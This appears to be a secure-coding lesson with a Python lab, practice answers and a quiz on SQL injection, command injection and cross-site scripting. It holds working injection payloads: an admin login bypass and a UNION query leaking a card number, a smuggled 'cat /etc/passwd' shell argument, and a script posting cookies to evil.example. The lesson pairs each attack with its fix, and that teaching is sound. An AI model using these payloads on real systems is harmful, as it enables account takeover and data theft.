---
track: secops
title: "Injection: SQL, commands and cross-site scripting"
short: Injection
sub: The most famous web bug, done for real against a throwaway database: logging in as admin without a password and dumping card numbers, then the one-line fix. Plus command injection and XSS.
---

:::goals
- explain injection as data being treated as code
- bypass a login and read another table with SQL injection on a local database
- fix it with parameterised queries
- prevent command injection and cross-site scripting
:::

## 1. One idea behind many bugs

**Injection** happens when a program builds code (SQL, a shell command, HTML) by gluing in text from a user. If the text contains the language's special characters, the user is no longer supplying **data**, they are writing **code**. It has been in the OWASP Top 10 since the list began.

## 2. SQL injection, done safely

An in-memory SQLite database with two users and a card table. (Passwords are stored in plain text here only to keep the demo short; [lesson 2](#secops-2) shows how it should be done.)

```run
mkdir -p ~/lab/sec && cd ~/lab/sec
cat > inject.py <<'EOF'
# SQL injection, then the fix. An in-memory database, so nothing real is touched.
import sqlite3, html
db = sqlite3.connect(":memory:")
db.executescript("""
CREATE TABLE users(id INTEGER PRIMARY KEY, name TEXT, password TEXT, role TEXT);
INSERT INTO users VALUES (1,'admin','s3cret-admin','admin'),(2,'asha','asha-pass','customer');
CREATE TABLE cards(user_id INT, number TEXT);
INSERT INTO cards VALUES (2,'4111 1111 1111 1111');
""")

def login_bad(name, pw):
    sql = f"SELECT id, name, role FROM users WHERE name = '{name}' AND password = '{pw}'"   # text glued into code
    print("   SQL:", sql)
    return db.execute(sql).fetchall()

def login_good(name, pw):
    return db.execute("SELECT id, name, role FROM users WHERE name = ? AND password = ?", (name, pw)).fetchall()

print("1) normal login");            print("  ", login_bad("asha", "asha-pass"))
print("2) wrong password");          print("  ", login_bad("asha", "guess"))
print("3) injection: the quote ends the string, -- comments out the password check")
print("  ", login_bad("admin' --", "anything"))
print("4) injection: UNION adds rows from another table")
print("  ", login_bad("x' UNION SELECT user_id, number, 'leak' FROM cards --", ""))
print("5) the same attacks against the parameterised query")
print("  ", login_good("admin' --", "anything"), login_good("x' UNION SELECT user_id, number, 'leak' FROM cards --", ""))

print("\nCross-site scripting: user text placed in a page")
comment = '<script>fetch("https://evil.example/?c="+document.cookie)</script>'
print("  unsafe:", f"<p>{comment}</p>")
print("  escaped:", f"<p>{html.escape(comment)}</p>")
EOF
python3 inject.py
```

- Attack 3: the name `admin' --` closes the quoted string, and `--` turns the password check into a **comment**. Logged in as admin with no password.
- Attack 4: `UNION SELECT` added rows from a completely different table. The login form leaked a card number.
- The fix is **parameters** (`?`). The query and the values travel separately, so the database never reads the values as SQL. Both attacks returned nothing.

Rules: always use parameters (or an ORM that does); give the app's database user **least privilege** (it should not be able to drop tables); never show raw database errors to users.

## 3. Command injection

The same mistake with the shell:

```term
subprocess.run("ping -c 1 " + host, shell=True)       # host = "8.8.8.8; cat /etc/passwd"  -> runs both
subprocess.run(["ping", "-c", "1", host])             # a list, no shell: host is one argument, never code
```

Pass a **list** of arguments and avoid `shell=True`. Better still, check the input against what you expect (an IP address or hostname pattern).

## 4. Cross-site scripting (XSS)

If a site puts a user's comment into a page as raw HTML, the comment can contain a `<script>` that runs in every visitor's browser and steals their session. The output above shows the fix: **escape** on output, so `<` becomes `&lt;` and the browser shows the text instead of running it. Modern template engines (Jinja2, React) escape by default; the danger is the escape hatches (`|safe`, `dangerouslySetInnerHTML`). A **Content Security Policy** header adds a second layer by blocking scripts the site did not ship.

## Common misconceptions

- "Escaping quotes fixes SQL injection." Hand-written escaping misses cases; parameters remove the problem entirely.
- "Our input box only allows 20 characters." Attackers send requests directly, not through your form.
- "XSS only shows an alert box." The script runs as the victim: it can read the page, send requests and steal tokens.

## Practice (answers below)

1. Try the name `asha' OR '1'='1' --` against `login_bad`. What comes back?
2. Rewrite `db.execute(f"DELETE FROM cart WHERE id = {cart_id}")` safely.
3. Why should the shop's database account not be allowed to DROP tables?

:::recap
- **Injection** = user text treated as code, in SQL, shell commands or HTML.
- Fix SQL injection with **parameterised queries**, plus a least-privilege database user.
- Avoid `shell=True`; pass argument lists. Prevent XSS by **escaping on output** and adding a Content Security Policy.
:::

:::note Answers
1. Every user, because the condition `'1'='1'` is always true and the password check is commented out. 2. `db.execute("DELETE FROM cart WHERE id = ?", (cart_id,))`. 3. Least privilege: if an injection is found anyway, the damage is limited to what that account can do.
:::

```quiz
? Why does `admin' --` log in without a password?
+ The quote ends the string and -- comments out the password check
- admin has no password
- SQLite ignores passwords
- The double dash is a wildcard
! The rest of the query becomes a comment.

? The reliable fix for SQL injection is:
+ Parameterised queries
- Removing all quotes from input
- Making the input box shorter
- Hiding error messages
! Values are sent separately from the SQL, so they are never parsed as code.

? What prevents a comment like <script>... from running in visitors' browsers?
+ Escaping the text when it is put into the page
- Encrypting the database
- Using HTTPS
- A stronger password policy
! Escaped, the browser shows the characters instead of running them.
```
